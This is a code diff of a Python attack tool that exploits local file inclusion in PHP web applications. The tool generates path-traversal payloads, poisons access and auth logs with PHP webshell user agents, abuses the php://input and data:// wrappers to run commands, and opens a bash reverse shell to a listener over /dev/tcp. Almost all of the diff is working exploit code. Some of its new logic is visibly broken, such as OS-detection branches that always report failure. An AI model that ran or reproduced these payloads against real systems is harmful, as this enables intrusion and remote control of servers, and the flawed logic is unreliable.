@@ -4,18 +4,16 @@ from check_target import get_ip_info
 from urllib.parse import urlunparse, urlparse, parse_qs, quote
 import re
 import sys
-import time
+import threading
 import base64
 import socket
-import requests
-import threading
 import paramiko
-#---------------------------------------------------Local File Inclusion-------------------------------------------------------------------#
+
 #---------------------------------------------------Path Traversal PoC Check---------------------------------------------------------------#
 def generate_traversals(os_type, depth, extra_files):
     unix_files = ["/etc/passwd"]
     windows_files = [
-        "boot.ini", "\\windows\\win.ini", "\\windows\\system32\\drivers\\etc\\hosts"
+        r"C:\Windows\win.ini"
     ]
     extra_files = extra_files if extra_files else []
 
@@ -63,11 +61,10 @@ def generate_traversals(os_type, depth, extra_files):
                     all_traversals.append(prefix + core + suffix)
 
     unique_payloads = sorted(set(all_traversals))
+    with open("payloads.txt", "w") as f:
+        for payload in unique_payloads:
+            f.write(payload + "\n")
     return unique_payloads
-
-
-def apply_traversal_to_filename(traversal, filename):
-    return traversal + encode_filename(filename, traversal)
 
 
 def encode_filename(filename, traversal):
@@ -76,7 +73,8 @@ def encode_filename(filename, traversal):
     return filename.replace("\\", "/")
 
 
-def test_traversal(url, traversal, success_count, failure_count, tried_count, retry_payloads, successful_payloads, stop_on_success, found_success, keyword, cookie):
+def test_traversal(url, traversal, success_count, failure_count, tried_count, retry_payloads, successful_payloads, stop_on_success,
+                   found_success, keyword, cookie, target_os):
 
     parsed_url = urlparse(url)
     parsed_query = parse_qs(parsed_url.query)
@@ -92,19 +90,26 @@ def test_traversal(url, traversal, success_count, failure_count, tried_count, re
     parsed_url.params, new_query, parsed_url.fragment
     ))
     try:
-        header =  f"User-Agent={get_random_user_agent()}"
-        response = get_query(new_url, cookie, header)
+        headers = {
+            "User-Agent": get_random_user_agent()
+        }
+        response = get_query(new_url, cookie, headers)
 
-        print(colored(f"Testing traversal payload: {traversal}", "yellow", attrs=["bold"]))
+
+        print(colored(f"Testing payload: {traversal}", "yellow", attrs=["bold"]))
 
         is_success = False
         if response:
             if keyword:
-                if keyword.lower() in response.text.lower() or "root:x" in response.text:
+                if keyword.lower() in response.text.lower():
                     is_success = True
             else:
-                if "root:x" in response.text:
-                    is_success = True
+                if target_os.lower() == "unix":
+                    if "root:x" in response.text:
+                        is_success = True
+                if target_os.lower() == "windows":
+                    if "[fonts]" in response.text:
+                        is_success = True
 
         if is_success:
             print(colored(f"[+] Target is vulnerable to {traversal}\n", "green", attrs=["bold"]))
@@ -113,7 +118,7 @@ def test_traversal(url, traversal, success_count, failure_count, tried_count, re
             if stop_on_success:
                 found_success.set()
         else:
-            print(colored(f"[-] Not vulnerable to {traversal}\n", "red", attrs=["bold"]))
+            print(colored(f"[-] Payload is not vulnerable {traversal}\n", "red", attrs=["bold"]))
             failure_count[0] += 1
 
         tried_count[0] += 1
@@ -121,6 +126,7 @@ def test_traversal(url, traversal, success_count, failure_count, tried_count, re
     except Exception as e:
         print(colored(f"[!] Error while testing {traversal}\n", "magenta"))
         print(e)
+
         retry_payloads.append(traversal)
 
 
@@ -149,7 +155,8 @@ def path_traversal_check(args):
 
             thread = threading.Thread(
                 target=test_traversal,
-                args=(args.url, traversal, success_count, failure_count, tried_count, retry_payloads, successful_payloads, stop_on_success, found_success, keyword, cookie)
+                args=(args.url, traversal, success_count, failure_count, tried_count, retry_payloads, successful_payloads, stop_on_success,
+                      found_success, keyword, cookie, target_os)
             )
             threads.append(thread)
             thread.start()
@@ -187,11 +194,11 @@ def path_traversal_check(args):
 
 #-------------------------------------------------------Access Log--------------------------------------------------------------------------#
 
-def attempt_access_log_poisoning(url, cookie, method):
+def attempt_access_log_poisoning(url, cookie, method, is_windows=False):
     if method == "shell_exec":
         malicious_ua = "<?php echo 'first_delimiter'; echo shell_exec($_GET['cmd']); echo 'last_delimiter'; ?>"
     elif method == "system":
-        malicious_ua = "<?php echo 'first_delimiter'; echo system($_GET['cmd']); echo 'last_delimiter'; ?>"
+        malicious_ua = "<?php echo 'first_delimiter'; system($_GET['cmd']); echo 'last_delimiter'; ?>"
     else:
         malicious_ua = "<?php echo 'first_delimiter'; echo exec($_GET['cmd']); echo 'last_delimiter'; ?>"
 
@@ -199,28 +206,33 @@ def attempt_access_log_poisoning(url, cookie, method):
         'User-Agent': malicious_ua
     }
 
-    if method in ["shell_exec","system","exec"]:
-        if "?" in url:
-            separator = "&"
-        else:
-            separator = "?"
-        url = url + separator + "cmd=uptime"
+    test_cmd = "set" if is_windows else "uptime"
 
-    get_query(url, cookie, headers)
-    response = get_query(url, cookie, get_random_user_agent())
+    if method in ["shell_exec", "system", "exec"]:
+        separator = "&" if "?" in url else "?"
+        test_url = url + separator + "cmd=" + quote(test_cmd)
+    else:
+        test_url = url
+
+    get_query(test_url, cookie, headers)
+
+    headers = {
+        "User-Agent":get_random_user_agent()
+    }
+    response = get_query(test_url, cookie, headers)
 
     if response is not None and response.status_code != 404:
         output = cmd_output(response.text)
-        if output is not None and "load average" in output.lower():
-            return True
+        if output is not None:
+            keyword = "c:\\windows\\system32" if is_windows else "load average"
+            if keyword in output.lower():
+                return True
     return False
 
 
 def access_log_poisoning(args):
     global response
     response = None
-
-    shell_flag = False
 
     url = args.url
     cookie = args.cookie or ""
@@ -229,60 +241,39 @@ def access_log_poisoning(args):
         print(colored("[-] Please enter a valid URL format.", "red", attrs=["bold"]))
         return
 
-    methods = ["system", "exec", "shell_exec"]
+    methods = ["system", "shell_exec", "exec"]
     success = {}
+
+    print(colored("[*] Detecting target OS via access log poisoning...\n", "yellow", attrs=["bold"]))
+    is_windows = False
+    if attempt_access_log_poisoning(url, cookie, "system", is_windows=True):
+        is_windows = True
+        print(colored("[+] Target is Windows.", "green", attrs=["bold"]))
+        if is_windows == False:
+            if attempt_access_log_poisoning(url, cookie, "system", is_windows=False):
+                print(colored("[+] Target is Linux.", "cyan", attrs=["bold"]))
+            else:
+                print(colored("[+] Couldn't detect OS.", "cyan", attrs=["bold"]))
+                return
+
+        print(colored("[+] Couldn't detect OS.", "cyan", attrs=["bold"]))
 
     for method in methods:
         print(colored(f"\n[*] Attempting access log poisoning using {method}...", "yellow", attrs=["bold"]))
-        success[method] = attempt_access_log_poisoning(url, cookie, method)
+        success[method] = attempt_access_log_poisoning(url, cookie, method, is_windows)
 
         if success[method]:
             print(colored(f"\n[+] Access log poisoning successful with {method}.\n", "green", attrs=["bold"]))
             break
-
         else:
             print(colored(f"\n[-] Access log poisoning attempt failed using {method}.\n", "red", attrs=["bold"]))
 
-    method_found = False
-    for method in methods:
-        if success.get(method, False):
-            method_found = True
-            break
-
-    if not method_found:
+    if not any(success.values()):
         print(colored("\n[-] No valid method to execute commands.\n", "red", attrs=["bold"]))
         print(colored("[*] Quitting...\n", "yellow", attrs=["bold"]))
         return
 
-    print(colored("\n[*] Press 0 to access shell environment.\n", "yellow", attrs=["bold"]))
-
-    while True:
-        cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()
-
-        if cmd.lower() == "exit" or cmd.lower() == "quit":
-            print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
-            return
-
-        if cmd == "0":
-            shell_flag = True
-            listener_port = get_port() or 4545
-            cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>&1\""
-
-        if success.get("system") or success.get("shell_exec") or success.get("exec"):
-                exec_url = url
-                separator = "&" if "?" in exec_url else "?"
-                exec_url += separator + "cmd=" + quote(cmd)
-
-                if shell_flag:
-                    shell_session(exec_url, cookie, get_random_user_agent(), cmd, listener_port, args)
-                    return
-
-                response = get_query(exec_url, cookie, get_random_user_agent())
-
-        if response is not None:
-            output = cmd_output(response.text)
-            if output is not None:
-                print(colored(output, "cyan", attrs=["bold"]))
+    interactive_shell_accesslog(url, cookie, is_windows, args)
 
 
 
@@ -315,7 +306,7 @@ def fake_ssh_conn(target_ip, port, payload, password):
         pass
 
 
-def attempt_auth_poisoning(url, cookie, target_ip, port, password, method):
+def attempt_auth_poisoning(url, cookie, target_ip, port, password, method, is_windows):
     if method == "shell_exec_get":
         payload = "<?php echo 'first_delimiter'; echo shell_exec($_GET['cmd']); echo 'last_delimiter'; ?>"
     elif method == "system_get":
@@ -331,22 +322,34 @@ def attempt_auth_poisoning(url, cookie, target_ip, port, password, method):
         separator = "&"
     else:
         separator = "?"
-    url = url + separator + "cmd=uptime"
+    if not is_windows:
+        url = url + separator + "cmd=uptime"
+    else:
+        url = url + separator + "cmd=set"
 
-    response = get_query(url, cookie, get_random_user_agent())
+    headers = {
+        "User-Agent": get_random_user_agent()
+    }
+
+    response = get_query(url, cookie, headers)
 
     if response is not None and response.status_code != 404:
         output = cmd_output(response.text)
-        if output is not None and "load average" in output.lower():
-            return True
-    return False
+        if output is not None:
+            if "load average" in output.lower():
+                print(colored("[*] Target is Linux.","light_yellow"))
+                return (True, True)
+            elif "c:\\windows\\system32" in output.lower():
+                print(colored("[*] Target is Windows.","light_yellow"))
+                return (True, True)
+            else:
+                return (False, None)
+
 
 def auth_log_poisoning(args):
     global response
     response = None
-    shell_flag = False
-
-
+    tis_windows, fis_windows = False, False
     url = args.url
     cookie = args.cookie or ""
 
@@ -363,7 +366,8 @@ def auth_log_poisoning(args):
 
     for method in methods:
         print(colored(f"\n[*] Attempting auth log poisoning using {method}...", "yellow", attrs=["bold"]))
-        success[method] = attempt_auth_poisoning(url, cookie, target_ip, port, password, method)
+        success[method], tis_windows = attempt_auth_poisoning(url, cookie, target_ip, port, password, method, is_windows=True)
+        success[method], fis_windows = attempt_auth_poisoning(url, cookie, target_ip, port, password, method, is_windows=False)
 
         if success[method]:
             print(colored(f"\n[+] Auth log poisoning successful with {method}.\n", "green", attrs=["bold"]))
@@ -371,51 +375,16 @@ def auth_log_poisoning(args):
         else:
             print(colored(f"\n[-] Auth Log poisoning attempt failed using {method}.\n", "red", attrs=["bold"]))
 
-    method_found = False
-    for method in methods:
-        if success.get(method, False):
-            method_found = True
-            break
+    method_found = any(success.get(m, False) for m in methods)
 
     if not method_found:
         print(colored("\n[-] No valid method to execute commands.\n", "red", attrs=["bold"]))
         print(colored("[*] Quitting...\n", "yellow", attrs=["bold"]))
         return
-
-    print(colored("\n[*] Press 0 to access shell environment.\n", "yellow", attrs=["bold"]))
-
-    while True:
-        cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()
-
-        if cmd.lower() == "exit" or cmd.lower() == "quit":
-            print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
-            return
-
-        if cmd == "0":
-            shell_flag = True
-            listener_port = get_port() or 4545
-            cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>&1\""
-
-
-        cmd_b64 = encode_payload(cmd)
-
-        if success.get("system_get") or success.get("passthru_get") or success.get("shell_exec_get"):
-                exec_url = url
-                separator = "&" if "?" in exec_url else "?"
-                exec_url += separator + "cmd=" + quote(cmd)
-
-                if shell_flag:
-                   shell_session(exec_url, cookie, get_random_user_agent(), cmd_b64, listener_port, args)
-                   return
-
-                response = get_query(exec_url, cookie, get_random_user_agent())
-
-        if response is not None:
-            output = cmd_output(response.text)
-            if output is not None:
-                output = output.strip()
-                if output:
-                    print(colored(output, "cyan", attrs=["bold"]))
+    if tis_windows:
+        interactive_shell_authlog(url, cookie, args, is_windows=True)
+    if fis_windows:
+        interactive_shell_authlog(url, cookie, args, is_windows=False)
 
 # -------------------------------------------------------php://filter--------------------------------------------------------------------------#
 def is_base64(data):
@@ -457,7 +426,11 @@ def php_filter(args):
 
     print(colored(f"[*] Fetching from: {new_url}", "yellow", attrs=["bold"]))
 
-    result = get_query(new_url, cookie, get_random_user_agent())
+    headers = {
+        "User-Agent": get_random_user_agent()
+    }
+
+    result = get_query(new_url, cookie, headers)
     if not result:
         print(colored("[!] No response received.", "red", attrs=["bold"]))
         return
@@ -505,159 +478,49 @@ def check_post_accept(args):
 def PHPinput_command_exec(url, cookie, args):
     print(colored("\n[*] Attempting to execute shell commands using shell_exec() and system() functions.", "yellow", attrs=["bold"]))
 
-    header = {"Content-Type": "application/x-www-form-urlencoded"}
+    header = {"Content-Type": "application/x-www-form-urlencoded",
+              "User-Agent": get_random_user_agent()}
+
+    is_windows = False
+
     target_url = f"{url}php://input"
-    user_agent = get_random_user_agent()
 
     for method in ["shell_exec", "system"]:
-        payload = f"<?php echo 'first_delimiter'; echo {method}('id'); echo 'last_delimiter'; ?>"
-        if attempt_command_exec(target_url, cookie, header, payload, method):
-            interactive_shell_loop(target_url, cookie, method, user_agent, args)
-            return
+
+        lin_payload = f"<?php echo 'first_delimiter'; echo {method}('uptime'); echo 'last_delimiter'; ?>"
+        win_payload = f"<?php echo 'first_delimiter'; echo {method}('set'); echo 'last_delimiter'; ?>"
+
+        if attempt_command_exec(target_url, cookie, header, win_payload, method, "windows"):
+            is_windows = True
+
+        if attempt_command_exec(target_url, cookie, header, lin_payload, method, "linux"):
+            is_windows = False
+
+        interactive_shell_input(target_url, cookie, method, header, args, is_windows)
+
 
     print(colored("\n[-] Neither shell_exec() nor system() were successful.\n", "red", attrs=["bold"]))
 
 
-def attempt_command_exec(url, cookie, header, payload, method):
+def attempt_command_exec(url, cookie, header, payload, method, os):
     response = post_query(url, cookie, header, payload, "")
     if response and response.status_code != 404:
         output = cmd_output(response.text)
-        if output and ("uid" in output or "gid" in output):
-            print(colored(f"\n[+] The command execution with {method} was successful.", "green", attrs=["bold"]))
+        if output:
+            if os == "windows":
+                if "[fonts]" in output.lower():
+                    print(colored(f"\n[+] The command execution with {method} was successful.", "green", attrs=["bold"]))
+                    print(colored(f"\n[*]Target is Windows.", "yellow", attrs=["bold"]))
+            if os == "linux":
+                if "load average" in output.lower():
+                    print(colored(f"\n[+] The command execution with {method} was successful.", "green", attrs=["bold"]))
+                    print(colored(f"\n[*]Target is Linux.", "yellow", attrs=["bold"]))
+
             return True
     return False
 
 
-def interactive_shell_loop(url, cookie, method, user_agent, args):
-    header = {"Content-Type": "application/x-www-form-urlencoded"}
-    print(colored("\n[*] Press 0 to access shell environment.\n", "yellow", attrs=["bold"]))
-
-    while True:
-        cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()
-        if cmd.lower() in ["exit", "quit"]:
-            print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
-            return
-
-        if not cmd:
-            continue
-
-        shell_flag = False
-        if cmd == "0":
-            shell_flag = True
-            listener_port = get_port()
-            cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>&1\""
-
-        cmd_b64 = base64.b64encode(cmd.encode()).decode()
-        payload = generate_payload(cmd_b64, method)
-
-        if shell_flag:
-            shell_session(url, cookie, user_agent, payload, listener_port, args)
-            return
-
-        try:
-            response = post_query(url, cookie, header, payload, "")
-            if response:
-                output = cmd_output(response.text)
-                print(colored(output, "cyan", attrs=["bold"]))
-        except requests.RequestException:
-            print(colored("\n[-] Error executing command", "red", attrs=["bold"]))
-
-
-
 # -------------------------------------------------------php://data--------------------------------------------------------------------------#
-
-def send_wrapper_data_cmd(url, cookie, format_name, format_payload):
-    qurl = url + format_payload
-    print(colored(f"[*] Trying {format_name} format...", "yellow"))
-    response = get_query(qurl, cookie, get_random_user_agent())
-    if response:
-        output = cmd_output(response.text)
-        if output and ("uid" in output or "gid" in output):
-            print(colored(f"[+] {format_name} format was successful.\n", "green"))
-            return True, format_name, format_payload
-        else:
-            print(colored(f"[-] {format_name} format was not successful.\n", "red"))
-    return False, None, None
-
-
-def find_data_payload(url, cookie):
-    cmd = "<?php echo 'first_delimiter'; system('id'); echo 'last_delimiter'; ?>"
-    encmd = base64.b64encode(cmd.encode()).decode()
-    encmd_url = quote(encmd)
-
-    formats = {
-        "data:,": f"data:,{cmd}",
-        "data://,": f"data://,{cmd}",
-        "data:text/plain;base64,": f"data:text/plain;base64,{encmd_url}",
-        "data://text/plain;base64,": f"data://text/plain;base64,{encmd_url}"
-    }
-
-    for name, payload in formats.items():
-        success, format_name, format_payload = send_wrapper_data_cmd(url, cookie, name, payload)
-        if success:
-            return format_name, format_payload
-
-    return None, None
-
-
-def execute_data_command(url, cookie, format_name, args):
-    shell_flag = False
-    print(colored(f"[*] Command execution started with format: {format_name}\n", "green"))
-    print(colored("[*] Press 0 to access shell environment.", "yellow"))
-
-    while True:
-        cmd = input(colored("Enter a command : ", "yellow")).strip()
-        if cmd.lower() in ["exit", "quit"]:
-            print(colored("[*] Quitting...", "yellow"))
-            break
-
-        if cmd == "0":
-            shell_flag = True
-            listener_port = get_port() or 4545
-
-            if "base64" not in format_name:
-                cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>%261\""
-
-            else:
-                cmd = f"/bin/bash -c \"bash -i > /dev/tcp/10.10.10.1/{listener_port} 0>&1\""
-
-            cmd = cmd.replace("'", "\\'")
-
-        if not cmd:
-            continue
-
-        try:
-            php_cmd = f"<?php echo 'first_delimiter'; system('{cmd}'); echo 'last_delimiter'; ?>"
-            encmd = base64.b64encode(php_cmd.encode()).decode()
-            encmd_url = quote(encmd)
-
-            if "base64" in format_name:
-                if format_name == "data:text/plain;base64,":
-                    payload = f"data:text/plain;base64,{encmd_url}"
-                else:
-                    payload = f"data://text/plain;base64,{encmd_url}"
-            else:
-                if format_name == "data:,":
-                    payload = f"data:,{php_cmd}"
-                else:
-                    payload = f"data://,{php_cmd}"
-
-            qurl = url + payload
-
-            if shell_flag:
-                shell_session(qurl, cookie, get_random_user_agent(), payload, listener_port, args)
-                return
-
-            response = get_query(qurl, cookie, get_random_user_agent())
-
-            if response:
-                output = cmd_output(response.text)
-                print(colored(output, "cyan"))
-
-        except requests.RequestException:
-            print(colored("[-] Error executing command", "red"))
-
-
 def php_data_wrapper(args):
     url = args.url
     cookie = args.cookie or ""
@@ -667,15 +530,215 @@ def php_data_wrapper(args):
     url = reformat_url(url)
     url = url.strip()
 
-    format_name, format_payload = find_data_payload(url, cookie)
+    is_windows = False
+
+    format_name, format_payload, os = find_data_payload(url, cookie)
     if format_name:
         print(colored(f"[*] Using successful format: {format_name}", "green"))
-        execute_data_command(url, cookie, format_name, args)
+        if os == "linux":
+            is_windows = False
+        if os == "windows":
+            is_windows = True
+        execute_data_command(url, cookie, format_name, args, is_windows)
     else:
         print(colored("[-] No working data:// format found.", "red"))
 
+def find_data_payload(url, cookie):
+    lin_cmd = "<?php echo 'first_delimiter'; system('uptime'); echo 'last_delimiter'; ?>"
+    win_cmd = "<?php echo 'first_delimiter'; system('set'); echo 'last_delimiter'; ?>"
+    win_encmd = base64.b64encode(win_cmd.encode()).decode()
+    win_encmd_url = quote(win_encmd)
+    lin_encmd = base64.b64encode(lin_cmd.encode()).decode()
+    lin_encmd_url = quote(lin_encmd)
 
-#--------------------------------------------------Remote File Inclusion--------------------------------------------------------------------#
+    win_formats = {
+        "data:,": f"data:,{win_cmd}",
+        "data://,": f"data://,{win_cmd}",
+        "data:text/plain;base64,": f"data:text/plain;base64,{win_encmd_url}",
+        "data://text/plain;base64,": f"data://text/plain;base64,{win_encmd_url}"
+    }
+
+    lin_formats = {
+        "data:,": f"data:,{lin_cmd}",
+        "data://,": f"data://,{lin_cmd}",
+        "data:text/plain;base64,": f"data:text/plain;base64,{lin_encmd_url}",
+        "data://text/plain;base64,": f"data://text/plain;base64,{lin_encmd_url}"
+    }
+
+    for name, payload in win_formats.items():
+        success, format_name, format_payload, os = send_wrapper_data_cmd(url, cookie, name, payload, "windows")
+        if success:
+            return format_name, format_payload, os
+
+    for name, payload in lin_formats.items():
+        success, format_name, format_payload, os = send_wrapper_data_cmd(url, cookie, name, payload, "linux")
+        if success:
+            return format_name, format_payload, os
+
+    return None, None, None
+
+
+def send_wrapper_data_cmd(url, cookie, format_name, format_payload, os):
+    qurl = url + format_payload
+    print(colored(f"[*] Trying {format_name} format for {os.capitalize()}...", "yellow"))
+
+    headers = {
+        "User-Agent": get_random_user_agent()
+    }
+
+    response = get_query(qurl, cookie, headers)
+    if response:
+        output = cmd_output(response.text)
+        if output:
+            if os == "linux":
+                if "load average" in output.lower():
+                        print(colored(f"[+] {format_name} format was successful.\n", "green"))
+                        print(colored("[*] Target is Linux.", "yellow"))
+                        return True, format_name, format_payload, "linux"
+                else:
+                    print(colored(f"[-] {format_name} format was not successful for {os.capitalize()}\n", "yellow"))
+            if os == "windows":
+                if "[fonts]" in output.lower():
+                        print(colored(f"[+] {format_name} format was successful.\n", "green"))
+                        print(colored("[*] Target is Windows.", "yellow"))
+                        return True, format_name, format_payload, "windows"
+                else:
+                    print(colored(f"[-] {format_name} format was not successful for {os.capitalize()}\n","yellow"))
+        else:
+            print(colored(f"[-] {format_name} format was not successful.\n", "red"))
+    return False, None, None, None
+
+
+
+def execute_data_command(url, cookie, format_name, args, is_windows):
+    print(colored(f"[*] Command execution started with format: {format_name}\n", "green"))
+
+    test_cmd = "<?php echo 'first_delimiter'; system('id'); echo 'last_delimiter'; ?>"
+    encmd = base64.b64encode(test_cmd.encode()).decode()
+    encmd_url = quote(encmd)
+
+    if "base64" in format_name:
+        if format_name == "data:text/plain;base64,":
+            payload = f"data:text/plain;base64,{encmd_url}"
+        else:
+            payload = f"data://text/plain;base64,{encmd_url}"
+    else:
+        if format_name == "data:,":
+            payload = f"data:,{test_cmd}"
+        else:
+            payload = f"data://,{test_cmd}"
+
+    full_url = url + payload
+
+    headers = {"User-Agent": get_random_user_agent()}
+    response = get_query(full_url, cookie, headers)
+    if response:
+
+        unified_interactive_shell(full_url, cookie=cookie, is_windows=is_windows, args=args,method=format_name, is_post=False, user_agent=headers,
+                           post_wrapper=False)
+    return
+
+
+def unified_interactive_shell(exec_url, cookie, is_windows, args, method="get", is_post=False, user_agent=None, post_wrapper=False):
+    print(colored("\n[*] Press 0 to access shell environment.", "yellow", attrs=["bold"]))
+
+    while True:
+        cmd = input(colored("\n[>] Enter a command: ", "yellow", attrs=["bold"])).strip()
+
+        if cmd.lower() in ("exit", "quit"):
+            print(colored("\n[*] Quitting...\n", "yellow", attrs=["bold"]))
+            return
+
+        shell_flag = False
+        if cmd == "0":
+            shell_flag = True
+            listener_ip = get_ip()
+            listener_port = get_port() or 4545
+
+            if is_windows:
+                cmd = "cmd"
+            else:
+                cmd = f"/bin/bash -c \"bash -i > /dev/tcp/{listener_ip}/{listener_port} 0>&1\""
+
+        cmd_b64 = encode_payload(cmd)
+
+        if not shell_flag:
+            if method.startswith("data"):
+                url, _ = exec_url.split(',', 1)
+                url += ','
+
+                if "base64" not in method:
+                    safe_cmd = cmd.replace("'", "\\'")
+                    payload = f"<?php echo 'first_delimiter'; system('{safe_cmd}'); echo 'last_delimiter'; ?>"
+                    full_exec_url = url + payload
+                else:
+                    safe_cmd = cmd.replace("'", "\\'")
+                    payload = f"<?php echo 'first_delimiter'; system('{safe_cmd}'); echo 'last_delimiter'; ?>"
+                    payload_b64 = base64.b64encode(payload.encode()).decode()
+                    full_exec_url = url + payload_b64
+            else:
+                separator = "&" if "?" in exec_url else "?"
+                full_exec_url = exec_url + separator + "cmd=" + quote(cmd)
+        else:
+            if not post_wrapper:
+                separator = "&" if "?" in exec_url else "?"
+                full_exec_url = exec_url + separator + "cmd=" + quote(cmd)
+            else:
+                full_exec_url = exec_url
+
+        headers = user_agent or {"User-Agent": get_random_user_agent()}
+
+        if shell_flag:
+            if method.startswith("data"):
+                url, _ = exec_url.split(',', 1)
+                url = url + ","
+
+                if "base64" not in method:
+                    cmd = f"/bin/bash -c \"bash -i > /dev/tcp/{listener_ip}/{listener_port} 0>%261\""
+                    cmd = cmd.replace("'", "\\'")
+                    payload = f"<?php echo 'first_delimiter'; system('{cmd}'); echo 'last_delimiter'; ?>"
+                    exec_url = url + payload
+
+                else:
+                    cmd = f"/bin/bash -c \"bash -i > /dev/tcp/{listener_ip}/{listener_port} 0>&1\""
+                    cmd = cmd.replace("'", "\\'")
+                    payload = f"<?php echo 'first_delimiter'; system('{cmd}'); echo 'last_delimiter'; ?>"
+                    payload_b64 = base64.b64encode(payload.encode()).decode()
+                    exec_url = url + payload_b64
+
+                shell_session(exec_url, cookie, headers, cmd, listener_port, args)
+                return
+
+            else:
+                payload = cmd if not post_wrapper else generate_payload(cmd_b64, method)
+                print(full_exec_url)
+                shell_session(full_exec_url, cookie, headers, payload, listener_port, args)
+                return
+
+        if is_post:
+            payload = cmd if not post_wrapper else generate_payload(cmd_b64, method)
+            response = post_query(full_exec_url, cookie, headers, payload, "")
+        else:
+            response = get_query(full_exec_url, cookie, headers)
+
+        if response is not None:
+            output = cmd_output(response.text)
+            if output:
+                print(colored(output.strip(), "cyan", attrs=["bold"]))
+
+def interactive_shell_authlog(exec_url, cookie, args, is_windows):
+    unified_interactive_shell(exec_url, cookie, is_windows, args, method="get")
+
+def interactive_shell_input(url, cookie, method, user_agent, args, os):
+    unified_interactive_shell(url, cookie, os, args, method=method, is_post=True, user_agent=user_agent, post_wrapper=True)
+
+def interactive_shell_accesslog(exec_url, cookie, is_windows, args):
+    unified_interactive_shell(exec_url, cookie, is_windows, args, method="get")
+
+
+
+
+
 
 
 
